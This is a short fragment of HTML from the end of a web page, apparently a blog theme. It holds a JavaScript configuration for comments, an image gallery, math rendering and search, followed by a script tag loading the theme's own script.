type="text/javascript">window.config={"code":{"maxShownLines":100},"comment":{"utterances":{"darkTheme":"github-dark","issueTerm":"pathname","label":"","lightTheme":"github-light","repo":"g03m0n/comments"}},"lightgallery":true,"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","maxResultLength":20,"noResultsFound":"No results found","snippetLength":30}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
